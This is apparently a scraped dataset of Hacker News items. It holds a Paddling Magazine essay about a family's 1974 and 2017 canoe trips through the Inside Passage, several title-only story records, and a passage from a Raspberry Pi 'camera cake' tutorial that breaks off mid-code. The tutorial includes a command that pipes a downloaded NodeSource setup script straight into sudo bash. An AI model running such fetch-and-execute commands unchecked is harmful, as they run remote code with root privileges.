https://paddlingmagazine-images.s3.amazonaws.com/2018/11/43-year-paddling-journey-through-passage6.jpg 1068w\" sizes=\"(max-width: 1068px) 100vw, 1068px\" />\n\n\t\t\t\tBrother Andy in 2017. | Photo: Courtesy of Nate & Alan Dappen\n\nThe story started in 1970.After my dad finished high school, he got a job as a deckhand on a yacht called the Thea Foss, taking guests up and down the Inside Passage, a labyrinth of straits and islands extending from Washington State up the coast of British Columbia and well into Alaska. Stuck on the boat, he watched the coastline pass by and dreamed of fishing and camping along its banks.\nHis summer experience sowed the seed of a grand idea to canoe the entire coastal waterway. He rushed home from his summer job to share this dream with his younger brother, Andy.My Dad and Andy had a unique relationship as brothers.Close in age, they were best friends throughout childhood and when they went off to university at Whitman College they roomed together.\nAs early adopters of outdoor adventure, they spent their weekends climbing, camping, fishing and ski-mountaineering in the wilderness of the Pacific Northwest. Together, they set a goal of embarking on a journey along the Inside Passage just after my dad graduated from college and before medical school consumed him.The only obstacles standing in their way were a lack of canoes and empty pockets.\nDetermined to make this trip a reality, they found a man in Bellingham, Washington who shared building plans. For the last six months of university, the duo worked every night in the college art building, sawing, sanding, bending and varnishing. With $500 and a lot of elbow grease, they built three gleaming cedarstrip canoes before graduating.\n\n\t\t\t\t<img decoding=\"async\" width=\"1068\" height=\"713\" src=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/11/paddling-adventure-through-passage1.jpg\" class=\"attachment-full size-full\" alt=\"people building canoes\" aria-describedby=\"gallery-2-18316\" srcset=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/10/paddling-adventure-through-passage1-300x200.jpg 300w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/paddling-adventure-through-passage1-768x513.jpg 768w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/paddling-adventure-through-passage1-1024x684.jpg 1024w, https://paddlingmagazine-images.s3.amazonaws.com/2018/11/paddling-adventure-through-passage1.jpg 1068w\" sizes=\"(max-width: 1068px) 100vw, 1068px\" />\n\n\t\t\t\tHard at work building boats after class. | Photo: Courtesy of Nate & Alan Dappen\n\n\t\t\t\t<img decoding=\"async\" width=\"1068\" height=\"713\" src=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/11/paddling-journey-through-passage.jpg\" class=\"attachment-full size-full\" alt=\"\" aria-describedby=\"gallery-2-18317\" srcset=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/10/paddling-journey-through-passage-300x200.jpg 300w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/paddling-journey-through-passage-768x513.jpg 768w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/paddling-journey-through-passage-1024x684.jpg 1024w, https://paddlingmagazine-images.s3.amazonaws.com/2018/11/paddling-journey-through-passage.jpg 1068w\" sizes=\"(max-width: 1068px) 100vw, 1068px\" />\n\n\t\t\t\t“If you were to buy these boats they would cost $3,000, $4,000, maybe $5,000. But we could make these woodstrip canoes for $150 at the time. We made these pieces of art because it was the cheapest option.”-Andy Dappen | Photo: Courtesy of Nate & Alan Dappen\n\n\t\t\t\t<img decoding=\"async\" width=\"1068\" height=\"713\" src=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/11/43-year-paddling-journey-through-passage8.jpg\" class=\"attachment-full size-full\" alt=\"people paddling a canoe in black and white\" aria-describedby=\"gallery-2-18314\" srcset=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-year-paddling-journey-through-passage8-300x200.jpg 300w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-year-paddling-journey-through-passage8-768x513.jpg 768w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-year-paddling-journey-through-passage8-1024x684.jpg 1024w, https://paddlingmagazine-images.s3.amazonaws.com/2018/11/43-year-paddling-journey-through-passage8.jpg 1068w\" sizes=\"(max-width: 1068px) 100vw, 1068px\" />\n\n\t\t\t\tTesting the homemade works of art. | Photo: Courtesy of Nate & Alan Dappen\n\nAt the time, only a few people had ever canoed the entire coastline, and there was virtually no information available.During the building process, my dad and Andy sent letters to fishermen, loggers, writers, homesteaders and the Forest Service—anyone and everyone they could think of who lived along the coast and could give them advice about canoeing the Passage.\nThe letters returned were almost unanimously apocalyptic. “Go home and sell your canoes,” they read. “You’re going to kill yourselves,” wrote another. “People go down in big boats on those waterways. Why are you going in a canoe?” Letter after letter returned, urging them not to do it. Finally, just a few weeks before they were planning to leave, one letter returned with the response they were waiting for. It began, “Do it. It’ll be the best trip of your life.”\nAt the time, my dad was dating a Wellesley college girl named Sara, who would eventually become my mother. They had been together for about a year, and he decided this canoe trip would be a good opportunity to get to know each other better. As an invitation, he sent her a survival kit filled with trinkets and tools he said would sustain her during the voyage. She accepted without hesitation. Soon after her parents sent her to a psychiatrist to attempt to talk her out of going.\nAs the story goes, by the time their sessions were over, the psychiatrist wanted to join the expedition.\n\n\t\t\t\t<img decoding=\"async\" width=\"1068\" height=\"713\" src=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/11/43-year-paddling-adventure-through-passage9.jpg\" class=\"attachment-full size-full\" alt=\"group of people wearing life jackets and holding paddles\" aria-describedby=\"gallery-3-18307\" srcset=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-year-paddling-adventure-through-passage9-300x200.jpg 300w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-year-paddling-adventure-through-passage9-768x513.jpg 768w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-year-paddling-adventure-through-passage9-1024x684.jpg 1024w, https://paddlingmagazine-images.s3.amazonaws.com/2018/11/43-year-paddling-adventure-through-passage9.jpg 1068w\" sizes=\"(max-width: 1068px) 100vw, 1068px\" />\n\n\t\t\t\tOne member of the 1974 paddling crew dropped out a couple weeks into the journey. | Photo: Courtesy of Nate & Alan Dappen\n\n\t\t\t\t<img decoding=\"async\" width=\"1068\" height=\"713\" src=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/11/43-paddling-adventure-through-passage10.jpg\" class=\"attachment-full size-full\" alt=\"canoes paddling in the distance with mountains in the background\" aria-describedby=\"gallery-3-18304\" srcset=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-paddling-adventure-through-passage10-300x200.jpg 300w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-paddling-adventure-through-passage10-768x513.jpg 768w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-paddling-adventure-through-passage10-1024x684.jpg 1024w, https://paddlingmagazine-images.s3.amazonaws.com/2018/11/43-paddling-adventure-through-passage10.jpg 1068w\" sizes=\"(max-width: 1068px) 100vw, 1068px\" />\n\n\t\t\t\tThe rest continued onto Ketchikan. | Photo: Courtesy of Nate & Alan Dappen\n\nOn June 14, 1974, my 20-year-old father, mother and uncle, along with a small crew of their friends, launched their three homemade canoes into the Pacific and began an eight-week journey along the Inside Passage.\nFor the next two months, they paddled, fished and camped in one of North America’s wildest landscapes. After their adventures along the coast, they returned home as different people. The canoe trip had changed them, and the story of the grand adventure lived on long after summer faded. Over the next 40 years, tales from their trip were told, and retold. Through a game of telephone and the metamorphosis of aging memories, the story of their adventure became morphed, exaggerated, forgotten and remembered. By the time I became an adult, it was hard for me to separate fact from legend. In my mind, and even in the minds of my parents, they had returned home upon the completion of their intended journey. But as a kid you never really get the full story.\n\nSome of the group needed to go back to college and had enough, while others wanted to continue on to Juneau, their intended destination. They had never completed the original trip as intended.\n\nIn September 2015, as we prepared centerpieces for the guest tables at my wedding, my uncle Andy told me by the time the group reached Ketchikan, about 800 miles from their starting point, the crew was divided. Some of the group needed to go back to college and had enough, while others wanted to continue on to Juneau, their intended destination. They had never completed the original trip as intended.\nWhen my dad and Andy started this trip, they were young men with endless possibilities in their lives. Now, 43 years later, they are both nearing the ends of their careers, with more time behind them than ahead. But they still had at least one big adventure left in them. On my wedding day, my brother, Andy, my dad and I made a plan. We decided to refurbish the canoes, return to the Inside Passage and complete the journey through the Pacific Northwest that had shaped them so profoundly as young men.\n\n\t\t\t\t<img decoding=\"async\" width=\"1068\" height=\"713\" src=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/11/43-paddling-adventure-through-passage11.jpg\" class=\"attachment-full size-full\" alt=\"fixing a canoe\" aria-describedby=\"gallery-4-18305\" srcset=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-paddling-adventure-through-passage11-300x200.jpg 300w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-paddling-adventure-through-passage11-768x513.jpg 768w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-paddling-adventure-through-passage11-1024x684.jpg 1024w, https://paddlingmagazine-images.s3.amazonaws.com/2018/11/43-paddling-adventure-through-passage11.jpg 1068w\" sizes=\"(max-width: 1068px) 100vw, 1068px\" />\n\n\t\t\t\tThe 2017 crew stripped down the boats and re-glassed the hulls. | Photo: Courtesy of Nate & Alan Dappen\n\n\t\t\t\t<img decoding=\"async\" width=\"1068\" height=\"713\" src=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/11/Hero_Template.jpg\" class=\"attachment-full size-full\" alt=\"two mend standing behind two canoes\" aria-describedby=\"gallery-4-18315\" srcset=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/10/Hero_Template-300x200.jpg 300w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/Hero_Template-768x513.jpg 768w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/Hero_Template-1024x684.jpg 1024w, https://paddlingmagazine-images.s3.amazonaws.com/2018/11/Hero_Template.jpg 1068w\" sizes=\"(max-width: 1068px) 100vw, 1068px\" />\n\n\t\t\t\t“It’s incredibly cool, you can see its old battle scars and history,” says Alan. | Photo: Courtesy of Nate & Alan Dappen\n\nOur first challenge was getting the four-decade-old canoes ready. When the crew returned home from Alaska in 1974, one canoe went with my parents, one with Andy, and the third was left at my grandparents’ house. Each canoe took on a life of its own. Andy became a professional adventure journalist, taking his canoe on even more epic journeys in places like the Yukon and on the Peace River. The canoe in my grandparents’ house became the Puget Sound fishing vessel on family visits. And the canoe my parents kept became a cornerstone of our childhood adventures. These boats were old, and needed work before they could complete the journey they were intended for.\nIt took a week to repair two of the canoes.When ready, the four of us ferried for two days from Bellingham, Washington to Ketchikan, Alaska. Our aim was to fulfill the original 1974 goal of reaching Juneau, a 300-mile paddle from Ketchikan.\n\nThe day we arrived in Ketchikan the rain poured and the wind howled. After just a few hours of paddling up the Tongass Narrows, everything and everyone was soaked. We were in the water for less than five hours before the weather turned and forced us to land on Gravian Island. We stayed there for two days, stranded by wind and high seas. Finally, the sun came out and we continued north.\nI was moved by the beauty and richness of the landscape. Every day, humpback whales breached around us. Pods of harbor porpoises rounded our canoes. Sea lions appeared suddenly around our boats, only to disappear a moment later and bark in the distance. Mink ate the many fish carcasses we disposed of after dining on the spoils of our outrageously productive fishing efforts. Evidence of bears was common and once, a young brown bear paraded through our camp, inspecting our canoes before entering the channel and swimming a half-mile to the other side. Even as a wildlife filmmaker, I have rarely seen such abundance.\n\nAs the days and nights melted into one another, and time disappeared, we shared stories, catching up on years of our busy, distant lives.\n\nA few days into the trip, as we paddled steadily through this remarkable landscape, Ben and I realized this was the longest time we had spent together since he left home for college 18 years earlier. For my dad and Andy, this was the longest they had spent together since the 1974 canoe trip, 43 years earlier. As the days and nights melted into one another, and time disappeared, we shared stories, catching up on years of our busy, distant lives.\n\n\t\t\t\t<img decoding=\"async\" width=\"1068\" height=\"713\" src=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/11/43-paddling-journey-through-passage.jpg\" class=\"attachment-full size-full\" alt=\"4 people standing in front of a lake with canoes\" aria-describedby=\"gallery-5-18306\" srcset=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-paddling-journey-through-passage-300x200.jpg 300w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-paddling-journey-through-passage-768x513.jpg 768w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-paddling-journey-through-passage-1024x684.jpg 1024w, https://paddlingmagazine-images.s3.amazonaws.com/2018/11/43-paddling-journey-through-passage.jpg 1068w\" sizes=\"(max-width: 1068px) 100vw, 1068px\" />\n\n\t\t\t\tBen Dappen, writer Nate Dappen, Uncle Andy Dappen, and father Alan Dappen. | Photo: Courtesy of Alan and Andy Dappen\n\n\t\t\t\t<img decoding=\"async\" width=\"1068\" height=\"713\" src=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/11/43-year-family-canoe-trip-legendary-brothers.jpg\" class=\"attachment-full size-full\" alt=\"\" aria-describedby=\"gallery-5-18416\" srcset=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-year-family-canoe-trip-legendary-brothers-300x200.jpg 300w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-year-family-canoe-trip-legendary-brothers-768x513.jpg 768w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-year-family-canoe-trip-legendary-brothers-1024x684.jpg 1024w, https://paddlingmagazine-images.s3.amazonaws.com/2018/11/43-year-family-canoe-trip-legendary-brothers.jpg 1068w\" sizes=\"(max-width: 1068px) 100vw, 1068px\" />\n\n\t\t\t\t“Not everyone can do the hardest route, not everyone can be the fastest, but everyone can do their own epic journey. And I think that’s more important. Follow the voice in you that says ‘I want to give it a shot,'” says Andy. | Photo: Courtesy of Alan and Andy Dappen\n\nAfter almost two weeks on the water, we entered the Zimovia Strait, camping on Etlin Island for several days before arriving in Wrangell, wheremy brother and I would dock our canoe and take the ferry south, leaving our father and Andy to complete the last stretch on their own.\nAs I watched my dad and Andy paddle off into the distance to finish a journey they started 43 years earlier, I reflected on how the story of their original 1974 canoe trip, an expedition I never experienced, had impacted me so profoundly. How the stories we tell and the stories we remember are reflections of who we see ourselves to be.\n\nAs children, we don’t have our own stories yet, so maybe we adopt the ones we’re told that most resonate with who we want to be.My parent’s 1974 canoe adventure had been one of those stories.\nFrom an early age, it was infused into my identity, shaping who I thought my parents were, and who I wanted to become. Now, as a father myself, I have many of my own stories to tell. And at the top of the list is an adventure along the Inside Passage that started in 1974 and ended in 2017.\n\nNate Dappen is an award-winning photographer and filmmaker based in New Jersey. His images, films, books and other projects have been featured by National Geographic, Vogue, The Washington Post, Scientific American, The Guardian and World Wildlife Fund.Watch his film inspired by this adventure below.\n\n<iframe title=\"The Passage\" width=\"1068\" height=\"601\" src=\"https://www.youtube.com/embed/H3a4MQh8Vak?feature=oembed&#038;enablejsapi=1\" frameborder=\"0\" allow=\"accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n\n(function(d,u,ac){var s=d.createElement('script');s.type='text/javascript';s.src='https://a.omappapi.com/app/js/api.min.js';s.async=true;s.dataset.user=u;s.dataset.campaign=ac;d.getElementsByTagName('head')[0].appendChild(s);})(document,58762,'o9jzn4ebcjqyzhmcgllf');\n\n                        TAGSAlaskaBritish ColumbiaCanoeingExpeditionFamilyPaddling Magazine Issue 55\n\n        FacebookTwitterPinterestEmailMix\n\n                                        Previous articleSecrets For Building Your Own Paddling SchoolNext articleWould You Rather Be Paddling With People Or Bears?        <img alt='' src='https://secure.gravatar.com/avatar/0a15c5fb052df370f193755790b99766?s=96&#038;d=blank&#038;r=g' srcset='https://secure.gravatar.com/avatar/0a15c5fb052df370f193755790b99766?s=192&#038;d=blank&#038;r=g 2x' class='avatar avatar-96 photo' height='96' width='96' decoding='async'/>Nate Dappen\n\n    var block_tdi_4 = new tdBlock();\nblock_tdi_4.id = \"tdi_4\";\nblock_tdi_4.atts = '{\"limit\":5,\"ajax_pagination\":\"next_prev\",\"live_filter\":\"cur_post_same_categories\",\"td_ajax_filter_type\":\"td_custom_related\",\"class\":\"td-related-full-width tdi_4\",\"td_column_number\":5,\"block_type\":\"td_block_related_posts\",\"live_filter_cur_post_id\":18303,\"live_filter_cur_post_author\":\"639\",\"block_template_id\":\"\",\"header_color\":\"\",\"ajax_pagination_infinite_stop\":\"\",\"offset\":\"\",\"td_ajax_preloading\":\"\",\"td_filter_default_txt\":\"\",\"td_ajax_filter_ids\":\"\",\"el_class\":\"\",\"color_preset\":\"\",\"ajax_pagination_next_prev_swipe\":\"\",\"border_top\":\"\",\"css\":\"\",\"tdc_css\":\"\",\"tdc_css_class\":\"tdi_4\",\"tdc_css_class_style\":\"tdi_4_rand_style\"}';\nblock_tdi_4.td_column_number = \"5\";\nblock_tdi_4.block_type = \"td_block_related_posts\";\nblock_tdi_4.post_count = \"5\";\nblock_tdi_4.found_posts = \"64\";\nblock_tdi_4.header_color = \"\";\nblock_tdi_4.ajax_pagination_infinite_stop = \"\";\nblock_tdi_4.max_num_pages = \"13\";\ntdBlocksArray.push(block_tdi_4);\nRELATED ARTICLESMORE FROM AUTHOR\n\n                <img width=\"218\" height=\"150\" class=\"entry-thumb\" src=\"https://paddlingmag.com/wp-content/uploads/2024/10/paddling-trips-you-can-do-0-cory-leis-218x150.jpg\"  srcset=\"https://paddlingmag.com/wp-content/uploads/2024/10/paddling-trips-you-can-do-0-cory-leis-218x150.jpg 218w, https://paddlingmag.com/wp-content/uploads/2024/10/paddling-trips-you-can-do-0-cory-leis-436x300.jpg 436w\" sizes=\"(-webkit-min-device-pixel-ratio: 2) 436px, (min-resolution: 192dpi) 436px, 218px\"  alt=\"a woman paddleboards in an idyllic tropical location in Indonesia\" title=\"Our Favorite Paddling Trips You Can Do\" />                Destinations\n\n                Our Favorite Paddling Trips You Can Do\n\n                <img width=\"218\" height=\"150\" class=\"entry-thumb\" src=\"https://paddlingmag.com/wp-content/uploads/2024/10/Boyd-Ruppelt-Victoria-Falls-Zambezi-River-selfie-218x150.jpg\"  srcset=\"https://paddlingmag.com/wp-content/uploads/2024/10/Boyd-Ruppelt-Victoria-Falls-Zambezi-River-selfie-218x150.jpg 218w, https://paddlingmag.com/wp-content/uploads/2024/10/Boyd-Ruppelt-Victoria-Falls-Zambezi-River-selfie-436x300.jpg 436w\" sizes=\"(-webkit-min-device-pixel-ratio: 2) 436px, (min-resolution: 192dpi) 436px, 218px\"  alt=\"The author Boyd Ruppelt below Victoria Falls.\" title=\"Going Pro At 35\" />                Culture\n\n                Going Pro At 35\n\n                <img width=\"218\" height=\"150\" class=\"entry-thumb\" src=\"https://paddlingmag.com/wp-content/uploads/2024/09/expedition-torngat-8-frank-wolf-218x150.jpg\"  srcset=\"https://paddlingmag.com/wp-content/uploads/2024/09/expedition-torngat-8-frank-wolf-218x150.jpg 218w, https://paddlingmag.com/wp-content/uploads/2024/09/expedition-torngat-8-frank-wolf-436x300.jpg 436w\" sizes=\"(-webkit-min-device-pixel-ratio: 2) 436px, (min-resolution: 192dpi) 436px, 218px\"  alt=\"A polar bear tastes the air when he sees us, trying to get our scent\" title=\"Expedition Torngat\" />                Adventures\n\n                Expedition Torngat\n\n                <img width=\"218\" height=\"150\" class=\"entry-thumb\" src=\"https://paddlingmag.com/wp-content/uploads/2024/06/greatest-kayaking-expeditions-0-jaime-sharp-218x150.jpg\"  srcset=\"https://paddlingmag.com/wp-content/uploads/2024/06/greatest-kayaking-expeditions-0-jaime-sharp-218x150.jpg 218w, https://paddlingmag.com/wp-content/uploads/2024/06/greatest-kayaking-expeditions-0-jaime-sharp-436x300.jpg 436w\" sizes=\"(-webkit-min-device-pixel-ratio: 2) 436px, (min-resolution: 192dpi) 436px, 218px\"  alt=\"silhouetted view of Freya Hoffmeister on one of her greatest kayaking expeditions\" title=\"Greatest Kayaking Expeditions Of The Century (So Far)\" />                Adventures\n\n                Greatest Kayaking Expeditions Of The Century (So Far)\n\n                <img width=\"218\" height=\"150\" class=\"entry-thumb\" src=\"https://paddlingmag.com/wp-content/uploads/2024/05/klamath-river-0-noahs-river-adventures-218x150.jpg\"  srcset=\"https://paddlingmag.com/wp-content/uploads/2024/05/klamath-river-0-noahs-river-adventures-218x150.jpg 218w, https://paddlingmag.com/wp-content/uploads/2024/05/klamath-river-0-noahs-river-adventures-436x300.jpg 436w\" sizes=\"(-webkit-min-device-pixel-ratio: 2) 436px, (min-resolution: 192dpi) 436px, 218px\"  alt=\"a group of rafters paddle down the renowned Hells Canyon section of the Klamath River\" title=\"Last Call On The Klamath River\" />                Features\n\n                Last Call On The Klamath River\n\n\t\tLEAVE A REPLY Cancel reply\n\n                Please enter your comment!\n\n\t\t\t            Please enter your name here\n\n\t\t\t            You have entered an incorrect email address!\n\t\t\t            Please enter your email address here\n\nSave my name, email, and website in this browser for the next time I comment.",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "cdda3cb35982651b",
    "title": {
      "en": "George Foreman has died",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://variety.com/2025/tv/news/george-foreman-boxer-infomercial-star-dies-1236345523/",
    "score": 310,
    "by": "wallflower",
    "time": 1742612169,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "a289ba8566d52c12",
    "title": {
      "en": "'Naive' science fan faces jail for plutonium import",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://au.news.yahoo.com/naive-science-fan-faces-jail-053025281.html",
    "score": 28,
    "by": "geox",
    "time": 1742687196,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "c98f733cb68ba2b2",
    "title": {
      "en": "London's Heathrow Airport announces complete shutdown due to power outage",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.cnn.com/2025/03/20/travel/london-heathrow-airport-shut-intl-hnk/index.html",
    "score": 229,
    "by": "dfine",
    "time": 1742527866,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "5871a04c53f991bc",
    "title": {
      "en": "Cake is watching you: I built a camera cake",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://medium.com/@hazalmestci/interact-with-your-cake-and-eat-it-too-24d25da25017",
    "score": 50,
    "by": "hazalmestci",
    "time": 1742406299,
    "content": "Interact with your cake and eat it too!Hazal Mestci·Follow11 min read·Feb 15, 202482ListenShareI attended the 95th New York Hardware Meetup on Smart Cities and IoT at Viam headquarters and during the mingling period, I met a very interesting and fun attendee named Abigail. She told me she is a confectionery roboticist making bizarre cakes. Listen, two things make me very excited: desserts and robots. So I was already hooked. She showed me her website and our love story began.Knowing that Viam was hosting a holiday party soon, I proposed the idea of collaborating with Abigail to create an interactive smart cake for the occasion. We arranged a meeting to discuss the project’s scope, materials, and potential features. During our conversation, we delved into a recurring joke at Viam where everything is humorously referred to as a camera in principle. The way we define cameras at Viam is unique. An ultrasonic sensor can be a camera, a lidar can be a camera, a bump sensor can be a camera. This led us to ponder: why not consider a cake as an edible camera component?This is the cake we made, which is also a camera, posing with a camera, photo taken with yet another camera:Our brainstorming session resulted in plans to incorporate LEDs, cameras for people detection, and other interactive components such as thermal printers and displays into the cake. We divided our roles, with me handling the technological aspects and Abigail taking charge of the cake-making process. With our roles defined, we dived into the prototyping phase. Here you can see our initial sketches.Imagine a cake that not only looks like a camera but houses a real camera inside, equipped with machine learning capabilities. As the smart cake detects people, a vibrant green NeoPixel light lights up around the camera, signaling its awareness. If you are in its frame and decide to capture the moment, you press a button and a white NeoPixel light performs a countdown before snapping the perfect shot. And the experience doesn’t end there — post-photo, the cake prints a personalized receipt, preserving the date, event name, and photo number, so that you can get your photo after the event and cherish the memories later on.Here you can see some photos my interactive camera took of my coworkers and I:And here how the receipt looks:Requirements to build a cake like this yourselfIf you want to build your own interactive cake, you need the following hardware, software, and modules.HardwareRaspberry Pi, with microSD card, set up following the Raspberry Pi Setup GuideRaspberry Pi display5V power supply24 RGB Neopixel LED ringAdafruit thermal printerThermal paper receipt roll 2–1/4\"USB webcamArcade buttonYou also need some cake supplies like cake paint, cake mix, food coloring, fondant, etc.Softwareviam-serverPython 3.8 or newerViam Python SDKViam Typescript SDKProject repository on GitHubModulesI used the following modules from the Viam Registry to interact with the NeoPixel and camera components.https://app.viam.com/module/ianwhalen/neopixelhttps://app.viam.com/module/viam/face-identificationThese have their own software requirements but as you add the module to your machine, they will get installed automatically.You do have to follow their Read Me’s to configure them correctly on your machine, which differs from module to module.For the NeoPixel module, my configuration looks like this in the Viam app:And my face-identification module configuration looks like this:Steps, if you need a cake yourselfWire your electronicsWire together your Raspberry Pi, NeoPixel, thermal printer, USB camera, and power supply according to their wiring diagrams.Wire the NeoPixel ring to the PiMake sure you wire the NeoPixel ring according to the guide below:Pi 5V to LED 5VPi GND to LED GNDPi GPIO18 to LED DinOn the Raspberry Pi, NeoPixels must be connected to GPIO10, GPIO12, GPIO18, or GPIO21 to work so it’s important to follow this step.Wire the thermal printer to the PiI wired my thermal printer according to the guide below but yours could look different depending on the printer you got:Pi GND to Printer GNDPi 8 GPIO 14 (UART TX) to data OUT of the printer, which is RXPi 10 GPIO 15 (UART RX) to data IN of the printer, which is TXAs you can see, the TX and RX from the printer go to specific GPIO pins with opposite functions. TX to RX and RX to TX, known as a crossover configuration. You can read more about the thermal receipt printer connections here.Also, all the Adafruit thermal printer varieties are bare units; they don’t have a DC barrel jack for power. Use a Female DC Power Adapter to connect to a 5V 2A power supply.Wire the webcam to the PiThe webcam is directly connected to the Raspberry Pi via USB.Test your componentsTest these components individually to see them working and debug in this step if anything is not working. You can test them in the Viam app. So let’s configure these components there.Configure your components, services, and modulesIn the Viam app, create a new machine and give it a name like cake. Follow the instructions on the Setup tab to install viam-server on your Raspberry Pi and connect to your robot. Then navigate to the Config tab of your machine’s page in the Viam app and configure your board, camera, detection cam, and NeoPixel generic component. Then configure your vision service as deepface-identification. Under the Modules tab, deploy the face-identification and NeoPixel modules from the registry. Follow the ReadMe’s of the modules to make sure they are configured correctly and fully.Now navigate to the Control tab of your machine’s page and test your machine!More detailed descriptions of the NeoPixel light capability, facial detection capability, and printing capability are described below in their corresponding sections.NeoPixel ring interactionI read this guide to learn about the NeoPixel Rings. It has information about different NeoPixel shapes, basic connections, best practices, and software.Some steps that I followed to achieve a successful interaction are explained below:I ran this command on a terminal window when I was SSH’d into my Pi:Sudo nano /boot/config.txtThe reason is that the sound must be disabled to use GPIO18. This can be done in /boot/config.txt by changing “dtparam=audio=on” to “dtparam=audio=off” and rebooting. Failing to do so can result in a segmentation fault.After checking everything was wired correctly and was lighting up, I started coding. The module documentation had an example code to light 24 pixels in green, one by one. I tweaked it to fit my purpose of lighting up different colors in different ranges at different event triggers.For the countdown this is how my code looks like:# LED 3 2 1 countdown  for repeat in range(3): # Decimal format white, 16777215 for color in [16777215, 0]: # Number of lights on the neopixel ring for pixel in range(24): await led.do_command({“set_pixel_color”: [pixel, color]}) await led.do_command({“show”: []})Facial detection capabilityI configured the face-identification module on my machine. I wanted to do specific actions for different people so I added photos of the different people I wanted to detect in a folder called known_faces on the Pi and specified them in my config attributes. For example, I added a few photos of Steve in a folder and pointed to it in the config so if the detection recognized the person as him, it would print out Steve.I did the same for my photos so I could test the interaction. I started getting detections when I tested my detection camera in the Control tab.Any person the model doesn’t recognize, it prints out “unknown”, and you can still trigger an event based on that. So the logic is: If it’s Steve, do this, if it’s Hazal, do that, if it’s anyone else, do something else.Display interactionI wanted to have my detections happen in a display so people could use it as a photobooth and pose looking at themselves. I thought I could do this using Viam’s Typescript SDK.First I had to make sure the language was set to my language of choice, which is English. I went to Settings on the display options, when the display is powered there is a blank screen and a menu, then you can go down (should be a logo that looks Windows), then back to the menu, and then up or down to change language, and then menu again. There are no instructions online so trust me on that.For some reason, my display said no signal and I used this thread to fix it. Apparently, the Pi can output a weak HDMI signal and few changes in settings are necessary. It says don’t do it but I did set hdmi_safe=1 (as that overrides many of the previous options) at the end.I also installed the full version of the Linux OS for the Pi (not the lite version that is in the install instructions) after fighting with the display for a while. When using the full version of Pi OS, the /boot/config.txt changes are not required.When I went to my machine configuration on the display, I could see my camera stream which was a success.But I wanted to make this stream full screen so I started the Typescript portion of the project.Typescript app full-screen interactionAs I was SSH’d into the Pi, I ran the following commands to install an example app made by Viam (I thought I could take the parts I needed from the example and tweak the rest which worked out well):sudo apt install gitgit clone https://github.com/viamrobotics/viam-typescript-sdk.gitcd viam-typescript-sdk/examples/teleop-react/In the cd’ed directory:curl -sL https://deb.nodesource.com/setup_20.x | sudo bash — sudo apt-get install nodejs -ynpm installcake2@cake2:~/viam-typescript-sdk/examples/teleop-react $ cd ../..cake2@cake2:~/viam-typescript-sdk $ make update-bufsudo npm install -g protoc-gen-grpc-webmake allcdcake2@cake2:~/viam-typescript-sdk/examples/teleop-react $nano .envHere you have to set the env variables, you can find your Api keys under here in fleet and your host is <yourmachinename>.<uniquestring>.viam.cloud. Mine is cake-main.35s324h8pp.viam.cloud as an example. Then I saved the set variables, exited and ran the following command:npm startI updated the camera name in the example to match my config:const stream = useStream(streamClient, ‘cam’);Mine is called ‘camera’. If we rename it to detectionCam, it will show the detections.The example had a lot of motion-related sections to move a rover, so I tailored the example to my project needs and took those parts out.Button press & print interactionNow I was ready to test if I could push a button, take a photo, and print something corresponding to that. I initially got inspired by this Halloween project where they designed a Fear Photo Booth.I tested the printer first and figured out some parameters for the specific printer I got, following this guide. You can see the Python library to manipulate the ESC/POS printers here.These parameters correspond to the printer I have, and I added them to my main function in the code.“”” 19200 Baud, 8N1, Flow Control Enabled “””printer = Serial(devfile=’/dev/serial0', baudrate=19200, bytesize=8, parity=’N’, stopbits=1, timeout=1.00, dsrdtr=True)I then added a logic to capture an image, interpolate a random value, save the photo to the device, and print a text corresponding to the image value. I added this in my person_detect function. I only want to do this if a person is detected and if they are pressing a button to take the photo.# Capture image, then interpolate random value and formatimage = await camera.get_image()num = (random.randint(1, 2**32))image_name = (f”./screenshots/party-photo-{num}.jpg”)image.save(image_name)printer.text(f”Viam Holiday Party\\nJanuary 18th, 2024\\nYour number is 